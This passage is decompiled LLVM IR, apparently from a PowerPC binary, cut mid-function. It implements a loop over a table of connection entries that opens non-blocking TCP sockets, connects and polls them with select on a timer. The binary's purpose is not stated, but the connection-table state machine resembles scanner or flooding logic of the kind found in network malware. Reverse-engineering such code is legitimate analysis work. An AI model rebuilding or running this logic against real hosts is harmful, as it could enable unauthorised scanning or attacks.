  store i32 %v0_10000d94, i32* %r3.global-to-local, align 4
  %v2_10000d98 = load i32, i32* %r18.global-to-local, align 4
  %v4_10000d98 = zext i32 %v2_10000d98 to i64
  %v5_10000d98 = mul nuw nsw i64 %v4_10000d98, %v1_10000d94
  %v1_10000d9c2 = udiv i64 %v5_10000d98, 17179869184
  %v1_10000d9c = trunc i64 %v1_10000d9c2 to i32
  %tmp113 = mul i32 %v1_10000d9c, -5
  %v3_10000da4 = add i32 %tmp113, %v0_10000d94
  store i32 %v3_10000da4, i32* %r0.global-to-local, align 4
  %v1_10000da8 = icmp ult i32 %v3_10000da4, 4
  %v2_10000da8 = icmp ugt i32 %v3_10000da4, 4
  %v3_10000da8 = icmp eq i32 %v3_10000da4, 4
  store i1 %v1_10000da8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000da8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000da8, label %dec_label_pc_10002460, label %dec_label_pc_10000db0

dec_label_pc_10000db0:                            ; preds = %dec_label_pc_10000d94
  %v1_10000db0 = mul i32 %v3_10000da4, 4
  store i32 %v1_10000db0, i32* %r0.global-to-local, align 4
  %v0_10000db4 = load i32, i32* %r19.global-to-local, align 4
  %v2_10000db4 = add i32 %v0_10000db4, %v1_10000db0
  %v3_10000db4 = inttoptr i32 %v2_10000db4 to i32*
  %v4_10000db4 = load i32, i32* %v3_10000db4, align 4
  %v2_10000db8 = add i32 %v4_10000db4, %v0_10000db4
  store i32 %v2_10000db8, i32* %r9.global-to-local, align 4
  store i32 %v2_10000db8, i32* %ctr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10000db8)
  br label %dec_label_pc_10000dcc

dec_label_pc_10000dcc:                            ; preds = %dec_label_pc_10002460, %dec_label_pc_10000db0, %dec_label_pc_10000c4c
  %storemerge8.in = load i32, i32* %r14.global-to-local, align 4
  %storemerge6 = icmp eq i32 %storemerge8.in, 0
  store i1 %storemerge6, i1* %cr3_eq.global-to-local, align 1
  store i32 65535, i32* %r0.global-to-local, align 4
  store i32 1195725824, i32* %r9.global-to-local, align 4
  store i32 268501184, i32* %r16.global-to-local, align 4
  %v2_10000de8 = ptrtoint i32* %stack_var_-20852 to i32
  store i32 %v2_10000de8, i32* %r19.global-to-local, align 4
  %v2_10000dec = ptrtoint i32* %stack_var_-20724 to i32
  store i32 %v2_10000dec, i32* %r18.global-to-local, align 4
  %v2_10000df0 = ptrtoint i32* %stack_var_-20888 to i32
  store i32 %v2_10000df0, i32* %r21.global-to-local, align 4
  %v2_10000df4 = ptrtoint i32* %stack_var_-20596 to i32
  store i32 %v2_10000df4, i32* %r23.global-to-local, align 4
  %v2_10000f5c = ptrtoint i32* %stack_var_-20868 to i32
  %v1_100010fc = bitcast i32* %stack_var_-20596 to i8*
  %v3_100012f8 = load i32, i32* @global_var_1001005c, align 4
  %v2_10000fd4 = ptrtoint i32* %stack_var_-20876 to i32
  %v3_100017bc = bitcast i32* %stack_var_-10356 to i8*
  %v3_10001aec = load i32, i32* @global_var_10010074, align 4
  %v3_10002268 = load i32, i32* @global_var_10010084, align 4
  %v2_10001080 = ptrtoint i32* %stack_var_-20884 to i32
  %v2_10001084 = ptrtoint i32* %stack_var_-20880 to i32
  br label %dec_label_pc_10000df8

dec_label_pc_10000df8:                            ; preds = %dec_label_pc_10000fc0, %dec_label_pc_10000fb8, %dec_label_pc_10000e48, %dec_label_pc_10001038, %dec_label_pc_10000dcc
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10000dfc = call i32 @__GI_time()
  store i32 %v0_10000dfc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-20852, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  store i32 %v0_10000dfc, i32* %r25.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10000e18

dec_label_pc_10000e18:                            ; preds = %dec_label_pc_10000e18, %dec_label_pc_10000df8
  %v1_10000e1c = phi i32 [ %v1_10000e20, %dec_label_pc_10000e18 ], [ 4, %dec_label_pc_10000df8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000e1c = load i32, i32* %r19.global-to-local, align 4
  %v3_10000e1c = add i32 %v2_10000e1c, %v1_10000e1c
  %v4_10000e1c = inttoptr i32 %v3_10000e1c to i32*
  store i32 0, i32* %v4_10000e1c, align 4
  %v0_10000e20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10000e20 = add i32 %v0_10000e20, 4
  store i32 %v1_10000e20, i32* %r9.global-to-local, align 4
  %v0_10000e24 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10000e24 = add i32 %v0_10000e24, -1
  store i32 %v1_10000e24, i32* %ctr.global-to-local, align 4
  %v2_10000e24 = icmp eq i32 %v1_10000e24, 0
  br i1 %v2_10000e24, label %dec_label_pc_10000e28, label %dec_label_pc_10000e18

dec_label_pc_10000e28:                            ; preds = %dec_label_pc_10000e18
  store i32 31, i32* %r11.global-to-local, align 4
  %v0_10000e2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000e2c, i32* %stack_var_-20724, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10000e38

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e38, %dec_label_pc_10000e28
  %v1_10000e3c = phi i32 [ %v1_10000e40, %dec_label_pc_10000e38 ], [ 4, %dec_label_pc_10000e28 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000e3c = load i32, i32* %r18.global-to-local, align 4
  %v3_10000e3c = add i32 %v2_10000e3c, %v1_10000e3c
  %v4_10000e3c = inttoptr i32 %v3_10000e3c to i32*
  store i32 0, i32* %v4_10000e3c, align 4
  %v0_10000e40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10000e40 = add i32 %v0_10000e40, 4
  store i32 %v1_10000e40, i32* %r9.global-to-local, align 4
  %v0_10000e44 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10000e44 = add i32 %v0_10000e44, -1
  store i32 %v1_10000e44, i32* %ctr.global-to-local, align 4
  %v2_10000e44 = icmp eq i32 %v1_10000e44, 0
  br i1 %v2_10000e44, label %dec_label_pc_10000e48, label %dec_label_pc_10000e38

dec_label_pc_10000e48:                            ; preds = %dec_label_pc_10000e38
  %v0_10000e48 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10000e48 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10000e48 = or i1 %v0_10000e48, %v1_10000e48
  br i1 %v2_10000e48, label %dec_label_pc_10000df8, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e48
  store i32 %v2_10000cc0, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  store i32 %v2_10000cc0, i32* @r28, align 4
  br label %dec_label_pc_10000eb0

dec_label_pc_10000e60:                            ; preds = %dec_label_pc_10000ebc
  %v3_10000e60 = icmp eq i8 %v3_10000eb0, 2
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000e60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e60, label %dec_label_pc_100014b0, label %dec_label_pc_10000e68

dec_label_pc_10000e68:                            ; preds = %dec_label_pc_10000e60
  %v1_10000e68 = icmp ult i8 %v3_10000eb0, 4
  %v3_10000e68 = icmp eq i8 %v3_10000eb0, 4
  store i1 %v1_10000e68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000e68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e68, label %dec_label_pc_100010c8, label %dec_label_pc_10000e70

dec_label_pc_10000e70:                            ; preds = %dec_label_pc_10000e68
  %v1_10000e70 = icmp ult i8 %v3_10000eb0, 6
  %v3_10000e70 = icmp eq i8 %v3_10000eb0, 6
  store i1 %v1_10000e70, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000e70, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e70, label %dec_label_pc_1000147c, label %dec_label_pc_10000e78

dec_label_pc_10000e78:                            ; preds = %dec_label_pc_10000e70
  %v1_10000e78 = icmp ult i8 %v3_10000eb0, 7
  %v3_10000e78 = icmp eq i8 %v3_10000eb0, 7
  store i1 %v1_10000e78, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000e78, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e78, label %dec_label_pc_1000147c, label %dec_label_pc_10000e80

dec_label_pc_10000e80:                            ; preds = %dec_label_pc_10000e78
  %v1_10000e80 = icmp ult i8 %v3_10000eb0, 10
  %v3_10000e80 = icmp eq i8 %v3_10000eb0, 10
  store i1 %v1_10000e80, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000e80, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e80, label %dec_label_pc_1000147c, label %dec_label_pc_10000e88

dec_label_pc_10000e88:                            ; preds = %dec_label_pc_100014b0, %dec_label_pc_10000e80
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10000e8c = inttoptr i32 %v2_100014c4 to i32*
  %v2_10000e8c = load i32, i32* %v1_10000e8c, align 4
  store i32 %v2_10000e8c, i32* @r3, align 4
  store i8 0, i8* %v2_10000eb0, align 1
  %v0_10000e94 = call i32 @__GI___libc_close()
  store i32 %v0_10000e94, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10000e9c = load i32, i32* @r28, align 4
  %v2_10000e9c = inttoptr i32 %v1_10000e9c to i32*
  store i32 -1, i32* %v2_10000e9c, align 4
  br label %dec_label_pc_10000ea0

dec_label_pc_10000ea0:                            ; preds = %dec_label_pc_10000f78, %dec_label_pc_1000147c, %dec_label_pc_1000141c, %dec_label_pc_10000ee8, %dec_label_pc_10000e88
  %v0_10000ea0 = load i32, i32* @r27, align 4
  %v1_10000ea0 = add i32 %v0_10000ea0, 1
  store i32 %v1_10000ea0, i32* @r27, align 4
  %v0_10000ea4 = load i32, i32* @r28, align 4
  %v1_10000ea4 = add i32 %v0_10000ea4, 3140
  store i32 %v1_10000ea4, i32* @r28, align 4
  %v1_10000ea8 = load i32, i32* @r24, align 4
  %v2_10000ea8 = icmp slt i32 %v1_10000ea0, %v1_10000ea8
  %v4_10000ea8 = icmp eq i32 %v1_10000ea0, %v1_10000ea8
  store i1 %v2_10000ea8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10000ea8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10000ea8, label %dec_label_pc_10000ea0.dec_label_pc_10000fb8_crit_edge, label %dec_label_pc_10000eb0

dec_label_pc_10000ea0.dec_label_pc_10000fb8_crit_edge: ; preds = %dec_label_pc_10000ea0
  %v0_10000fb8.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000fb8

dec_label_pc_10000eb0:                            ; preds = %dec_label_pc_10000fa8, %dec_label_pc_10000ea0, %dec_label_pc_10000e4c
  %v2_100014c4 = phi i32 [ %v2_10000cc0, %dec_label_pc_10000e4c ], [ %v1_10000ea4, %dec_label_pc_10000ea0 ], [ %v1_10000fac, %dec_label_pc_10000fa8 ]
  %v1_10000eb0 = add i32 %v2_100014c4, 4
  %v2_10000eb0 = inttoptr i32 %v1_10000eb0 to i8*
  %v3_10000eb0 = load i8, i8* %v2_10000eb0, align 1
  %v4_10000eb0 = zext i8 %v3_10000eb0 to i32
  store i32 %v4_10000eb0, i32* %r0.global-to-local, align 4
  %v1_10000eb4 = icmp eq i8 %v3_10000eb0, 0
  %v3_10000eb4 = icmp eq i8 %v3_10000eb0, 1
  store i1 %v1_10000eb4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000eb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000eb4, label %dec_label_pc_100010b4, label %dec_label_pc_10000ebc

dec_label_pc_10000ebc:                            ; preds = %dec_label_pc_10000eb0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v1_10000eb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10000eb4, label %dec_label_pc_10000ec4, label %dec_label_pc_10000e60

dec_label_pc_10000ec4:                            ; preds = %dec_label_pc_10000ebc, %dec_label_pc_100014c4
  %v0_10000ec4 = phi i32 [ %v2_100014c4, %dec_label_pc_10000ebc ], [ %v0_10000ec4.pre, %dec_label_pc_100014c4 ]
  %v1_10000ec4 = inttoptr i32 %v0_10000ec4 to i32*
  %v2_10000ec4 = load i32, i32* %v1_10000ec4, align 4
  store i32 %v2_10000ec4, i32* @r3, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10000ed0 = icmp slt i32 %v2_10000ec4, -1
  %v3_10000ed0 = icmp eq i32 %v2_10000ec4, -1
  store i1 %v1_10000ed0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000ed0, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-20868, align 4
  br i1 %v3_10000ed0, label %dec_label_pc_10000ee8, label %dec_label_pc_10000ee4

dec_label_pc_10000ee4:                            ; preds = %dec_label_pc_10000ec4
  %v0_10000ee4 = call i32 @__GI___libc_close()
  store i32 %v0_10000ee4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000ee8

dec_label_pc_10000ee8:                            ; preds = %dec_label_pc_10000ec4, %dec_label_pc_10000ee4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 268439288, i32* @lr, align 4
  %v3_10000ef4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10000ef4, i32* %r3.global-to-local, align 4
  %v1_10000ef8 = icmp slt i32 %v3_10000ef4, -1
  %v3_10000ef8 = icmp eq i32 %v3_10000ef4, -1
  store i1 %v1_10000ef8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000ef8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10000ef4, i32* %r31.global-to-local, align 4
  %v1_10000f00 = load i32, i32* @r28, align 4
  %v2_10000f00 = inttoptr i32 %v1_10000f00 to i32*
  store i32 %v3_10000ef4, i32* %v2_10000f00, align 4
  br i1 %v3_10000ef8, label %dec_label_pc_10000ea0, label %dec_label_pc_10000f08

dec_label_pc_10000f08:                            ; preds = %dec_label_pc_10000ee8
  store i32 3, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 268439320, i32* @lr, align 4
  %v1_10000f14 = call i32 @__libc_fcntl(i32 3)
  store i32 4, i32* @r4, align 4
  %v1_10000f1c = or i32 %v1_10000f14, 2048
  store i32 %v1_10000f1c, i32* @r5, align 4
  %v0_10000f20 = load i32, i32* @r31, align 4
  store i32 %v0_10000f20, i32* %r3.global-to-local, align 4
  store i32 268439340, i32* @lr, align 4
  %v2_10000f28 = call i32 @__libc_fcntl(i32 %v0_10000f20)
  store i32 %v2_10000f28, i32* %r3.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v0_10000f30 = load i32, i32* @r28, align 4
  %v1_10000f30 = inttoptr i32 %v0_10000f30 to i32*
  %v2_10000f30 = load i32, i32* %v1_10000f30, align 4
  store i32 %v2_10000f30, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 65535, i32* %stack_var_-20888, align 4
  store i32 268439372, i32* @lr, align 4
  %v5_10000f48 = call i32 @__GI_setsockopt(i32 %v2_10000f30, i32 0, i32 8, i32 %v2_10000df0, i32 4)
  store i32 %v5_10000f48, i32* %r3.global-to-local, align 4
  %v0_10000f4c = load i32, i32* @r28, align 4
  %v1_10000f4c = add i32 %v0_10000f4c, 16
  %v2_10000f4c = inttoptr i32 %v1_10000f4c to i32*
  %v3_10000f4c = load i32, i32* %v2_10000f4c, align 4
  store i32 %v3_10000f4c, i32* %r9.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10000f54 = inttoptr i32 %v0_10000f4c to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  store i32 %v2_10000f54, i32* %r3.global-to-local, align 4
  store i32 %v2_10000f5c, i32* %r4.global-to-local, align 4
  %v3_10000f60 = add i32 %v0_10000f4c, 4
  %v4_10000f60 = inttoptr i32 %v3_10000f60 to i8*
  store i8 2, i8* %v4_10000f60, align 1
  %v0_10000f68 = load i32, i32* %r25.global-to-local, align 4
  %v1_10000f68 = load i32, i32* @r28, align 4
  %v2_10000f68 = add i32 %v1_10000f68, 8
  %v3_10000f68 = inttoptr i32 %v2_10000f68 to i32*
  store i32 %v0_10000f68, i32* %v3_10000f68, align 4
  %v0_10000f6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000f6c, i32* %stack_var_-20868, align 4
  store i32 268439416, i32* @lr, align 4
  %v3_10000f74 = call i32 @__libc_connect(i32 %v2_10000f54, i32 %v2_10000f5c, i32 16)
  store i32 %v3_10000f74, i32* %r3.global-to-local, align 4
  %v0_10000f78.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10000f78

dec_label_pc_10000f78:                            ; preds = %dec_label_pc_100014b0, %dec_label_pc_10000f08
  %v0_10000f78 = phi i32 [ %v2_100014c4, %dec_label_pc_100014b0 ], [ %v0_10000f78.pre, %dec_label_pc_10000f08 ]
  %v1_10000f78 = inttoptr i32 %v0_10000f78 to i32*
  %v2_10000f78 = load i32, i32* %v1_10000f78, align 4
  store i32 %v2_10000f78, i32* @r8, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10000f80 = call i32 @__asm_rlwinm(i32 %v2_10000f78, i32 29, i32 3, i32 29)
  %v1_10000f84 = load i32, i32* %r26.global-to-local, align 4
  %v2_10000f84 = icmp slt i32 %v2_10000f78, %v1_10000f84
  %v3_10000f84 = icmp sgt i32 %v2_10000f78, %v1_10000f84
  %v4_10000f84 = icmp eq i32 %v2_10000f78, %v1_10000f84
  store i1 %v2_10000f84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10000f84, i1* %cr7_eq.global-to-local, align 1
  %v1_10000f88 = load i32, i32* %r21.global-to-local, align 4
  %v2_10000f88 = add i32 %v1_10000f88, %v1_10000f80
  store i32 %v2_10000f88, i32* %r11.global-to-local, align 4
  %v1_10000f8c = urem i32 %v2_10000f78, 32
  %v1_10000f90 = add i32 %v2_10000f88, 164
  %v2_10000f90 = inttoptr i32 %v1_10000f90 to i32*
  %v3_10000f90 = load i32, i32* %v2_10000f90, align 4
  %v0_10000f94 = load i32, i32* %r0.global-to-local, align 4
  %v3_10000f94 = shl i32 %v0_10000f94, %v1_10000f8c
  store i32 %v3_10000f94, i32* %r0.global-to-local, align 4
  %v2_10000f98 = or i32 %v3_10000f94, %v3_10000f90
  store i32 %v2_10000f98, i32* %r9.global-to-local, align 4
  store i32 %v2_10000f98, i32* %v2_10000f90, align 4
  br i1 %v3_10000f84, label %dec_label_pc_10000fa4, label %dec_label_pc_10000ea0

dec_label_pc_10000fa4:                            ; preds = %dec_label_pc_10000f78
  %v1_10000fa4 = add i32 %v2_10000f78, 1
  store i32 %v1_10000fa4, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000fa8

dec_label_pc_10000fa8:                            ; preds = %dec_label_pc_100014a8, %dec_label_pc_10001474, %dec_label_pc_10000fa4
  %v0_10000fb830 = phi i32 [ %v1_100014a8, %dec_label_pc_100014a8 ], [ %v1_10001474, %dec_label_pc_10001474 ], [ %v1_10000fa4, %dec_label_pc_10000fa4 ]
  %v0_10000fa8 = load i32, i32* @r27, align 4
  %v1_10000fa8 = add i32 %v0_10000fa8, 1
  store i32 %v1_10000fa8, i32* @r27, align 4
  %v0_10000fac = load i32, i32* @r28, align 4
  %v1_10000fac = add i32 %v0_10000fac, 3140
  store i32 %v1_10000fac, i32* @r28, align 4
  %v1_10000fb0 = load i32, i32* @r24, align 4
  %v2_10000fb0 = icmp slt i32 %v1_10000fa8, %v1_10000fb0
  %v4_10000fb0 = icmp eq i32 %v1_10000fa8, %v1_10000fb0
  store i1 %v2_10000fb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10000fb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10000fb0, label %dec_label_pc_10000fb8, label %dec_label_pc_10000eb0

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000fa8, %dec_label_pc_10000ea0.dec_label_pc_10000fb8_crit_edge
  %v0_10000fd8 = phi i32 [ %v0_10000fb8.pre, %dec_label_pc_10000ea0.dec_label_pc_10000fb8_crit_edge ], [ %v0_10000fb830, %dec_label_pc_10000fa8 ]
  %v1_10000fb8 = icmp slt i32 %v0_10000fd8, 0
  %v3_10000fb8 = icmp eq i32 %v0_10000fd8, 0
  store i1 %v1_10000fb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000fb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000fb8, label %dec_label_pc_10000df8, label %dec_label_pc_10000fc0

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000fb8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 %v2_10000de8, i32* %r4.global-to-local, align 4
  store i32 %v0_10000fd8, i32* %r3.global-to-local, align 4
  store i32 1, i32* %stack_var_-20876, align 4
  store i32 268439528, i32* @lr, align 4
  %v5_10000fe4 = call i32 @__libc_select(i32 %v0_10000fd8, i32 %v2_10000de8, i32 %v2_10000dec, i32 0, i32 %v2_10000fd4)
  store i32 %v5_10000fe4, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10000ff0 = call i32 @__GI_time()
  store i32 %v0_10000ff0, i32* %r3.global-to-local, align 4
  %v0_10000ff4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10000ff4 = icmp slt i32 %v0_10000ff4, 0
  %v3_10000ff4 = icmp eq i32 %v0_10000ff4, 0
  store i1 %v1_10000ff4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000ff4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10000ff0, i32* %r17.global-to-local, align 4
  %tmp115 = icmp slt i32 %v0_10000ff4, 1
  br i1 %tmp115, label %dec_label_pc_10000df8, label %dec_label_pc_10001000

dec_label_pc_10001000:                            ; preds = %dec_label_pc_10000fc0
  store i32 0, i32* %r22.global-to-local, align 4
  %v0_10001048.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10001048

dec_label_pc_10001008:                            ; preds = %dec_label_pc_10001054, %dec_label_pc_100010a0
  %v1_10001010 = phi i32 [ %v1_10001058, %dec_label_pc_10001054 ], [ %v1_100010a8, %dec_label_pc_100010a0 ]
  %v1_10001008 = phi i32 [ %v1_1000105c, %dec_label_pc_10001054 ], [ %v1_10001008.pre, %dec_label_pc_100010a0 ]
  %v0_10001008 = phi i32 [ %v1_10001054, %dec_label_pc_10001054 ], [ %v1_100010ac, %dec_label_pc_100010a0 ]
  %v2_10001008 = add i32 %v0_10001008, %v1_10001008
  store i32 %v2_10001008, i32* %r9.global-to-local, align 4
  %v1_1000100c = add i32 %v2_10001008, 36
  %v2_1000100c = inttoptr i32 %v1_1000100c to i32*
  %v3_1000100c = load i32, i32* %v2_1000100c, align 4
  %v2_10001010 = urem i32 %v1_10001010, 32
  %v3_10001010 = sub nsw i32 0, %v1_10001010
  %v4_10001010 = urem i32 %v3_10001010, 32
  %v5_10001010 = shl i32 %v3_1000100c, %v4_10001010
  %v6_10001010 = xor i32 %v4_10001010, 31
  %v7_10001010 = lshr i32 %v3_1000100c, %v6_10001010
  %v8_10001010 = udiv i32 %v7_10001010, 2
  %v9_10001010 = or i32 %v8_10001010, %v5_10001010
  %v12_10001010 = lshr i32 -1, %v2_10001010
  %v14_10001010 = and i32 %v9_10001010, %v12_10001010
  %v15_10001010 = ashr i32 %v3_1000100c, 31
  %v16_10001010 = sub i32 -1, %v12_10001010
  %v17_10001010 = and i32 %v15_10001010, %v16_10001010
  %v18_10001010 = or i32 %v14_10001010, %v17_10001010
  store i32 %v18_10001010, i32* %r0.global-to-local, align 4
  %v1_10001014 = urem i32 %v18_10001010, 2
  store i32 %v1_10001014, i32* %r9.global-to-local, align 4
  %v3_10001014 = icmp eq i32 %v1_10001014, 0
  br i1 %v3_10001014, label %dec_label_pc_10001038, label %dec_label_pc_1000101c

dec_label_pc_1000101c:                            ; preds = %dec_label_pc_10001008
  %v0_1000101c = load i32, i32* @r30, align 4
  %v1_1000101c = add i32 %v0_1000101c, 4
  %v2_1000101c = inttoptr i32 %v1_1000101c to i8*
  %v3_1000101c = load i8, i8* %v2_1000101c, align 1
  %v4_1000101c = zext i8 %v3_1000101c to i32
  store i32 %v4_1000101c, i32* %r0.global-to-local, align 4
  %v1_10001020 = icmp ult i8 %v3_1000101c, 6
  %v3_10001020 = icmp eq i8 %v3_1000101c, 6
  store i1 %v1_10001020, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001020, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001020, label %dec_label_pc_10001730, label %dec_label_pc_10001028

dec_label_pc_10001028:                            ; preds = %dec_label_pc_1000101c
  %v1_10001028 = icmp ult i8 %v3_1000101c, 7
  %v3_10001028 = icmp eq i8 %v3_1000101c, 7
  store i1 %v1_10001028, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001028, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001028, label %dec_label_pc_100014cc, label %dec_label_pc_10001030

dec_label_pc_10001030:                            ; preds = %dec_label_pc_10001028
  %v1_10001030 = icmp ult i8 %v3_1000101c, 10
  %v3_10001030 = icmp eq i8 %v3_1000101c, 10
  store i1 %v1_10001030, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001030, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001030, label %dec_label_pc_10001d60, label %dec_label_pc_10001038

dec_label_pc_10001038:                            ; preds = %dec_label_pc_100015c0, %dec_label_pc_10001dc8, %dec_label_pc_10001da0, %dec_label_pc_10001030, %dec_label_pc_10001008, %dec_label_pc_10001048, %dec_label_pc_10001778, %dec_label_pc_100021fc, %dec_label_pc_100021b4, %dec_label_pc_100020cc, %dec_label_pc_10002044, %dec_label_pc_1000202c, %dec_label_pc_10001fcc, %dec_label_pc_10001dd4, %dec_label_pc_10001dac, %dec_label_pc_10001d44, %dec_label_pc_10001c60, %dec_label_pc_10001718, %dec_label_pc_10001624
  %v0_10001038 = load i32, i32* %r22.global-to-local, align 4
  %v1_10001038 = add i32 %v0_10001038, 1
  store i32 %v1_10001038, i32* %r22.global-to-local, align 4
  %v0_1000103c = load i32, i32* @r30, align 4
  %v1_1000103c = add i32 %v0_1000103c, 3140
  store i32 %v1_1000103c, i32* @r30, align 4
  %v1_10001040 = load i32, i32* @r24, align 4
  %v2_10001040 = icmp slt i32 %v1_10001038, %v1_10001040
  %v4_10001040 = icmp eq i32 %v1_10001038, %v1_10001040
  store i1 %v2_10001040, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10001040, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10001040, label %dec_label_pc_10000df8, label %dec_label_pc_10001048

dec_label_pc_10001048:                            ; preds = %dec_label_pc_10001038, %dec_label_pc_10001000
  %v0_10001048 = phi i32 [ %v1_1000103c, %dec_label_pc_10001038 ], [ %v0_10001048.pre, %dec_label_pc_10001000 ]
  %v1_10001048 = inttoptr i32 %v0_10001048 to i32*
  %v2_10001048 = load i32, i32* %v1_10001048, align 4
  store i32 %v2_10001048, i32* %r3.global-to-local, align 4
  %v1_1000104c = icmp slt i32 %v2_10001048, -1
  %v3_1000104c = icmp eq i32 %v2_10001048, -1
  store i1 %v1_1000104c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000104c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000104c, label %dec_label_pc_10001038, label %dec_label_pc_10001054

dec_label_pc_10001054:                            ; preds = %dec_label_pc_10001048
  %v1_10001054 = call i32 @__asm_rlwinm(i32 %v2_10001048, i32 29, i32 3, i32 29)
  %v1_10001058 = urem i32 %v2_10001048, 32
  store i32 %v1_10001058, i32* %r11.global-to-local, align 4
  %v1_1000105c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000105c = add i32 %v1_1000105c, %v1_10001054
  store i32 %v2_1000105c, i32* %r9.global-to-local, align 4
  %v1_10001060 = add i32 %v2_1000105c, 164
  %v2_10001060 = inttoptr i32 %v1_10001060 to i32*
  %v3_10001060 = load i32, i32* %v2_10001060, align 4
  %v3_10001064 = sub i32 0, %v2_10001048
  %v4_10001064 = urem i32 %v3_10001064, 32
  %v5_10001064 = shl i32 %v3_10001060, %v4_10001064
  %v6_10001064 = xor i32 %v4_10001064, 31
  %v7_10001064 = lshr i32 %v3_10001060, %v6_10001064
  %v8_10001064 = udiv i32 %v7_10001064, 2
  %v9_10001064 = or i32 %v8_10001064, %v5_10001064
  %v12_10001064 = lshr i32 -1, %v1_10001058
  %v14_10001064 = and i32 %v9_10001064, %v12_10001064
  %v15_10001064 = ashr i32 %v3_10001060, 31
  %v16_10001064 = sub i32 -1, %v12_10001064
  %v17_10001064 = and i32 %v15_10001064, %v16_10001064
  %v18_10001064 = or i32 %v14_10001064, %v17_10001064
  store i32 %v18_10001064, i32* %r0.global-to-local, align 4
  %v1_10001068 = urem i32 %v18_10001064, 2
  store i32 %v1_10001068, i32* %r9.global-to-local, align 4
  %v3_10001068 = icmp eq i32 %v1_10001068, 0
  br i1 %v3_10001068, label %dec_label_pc_10001008, label %dec_label_pc_10001070

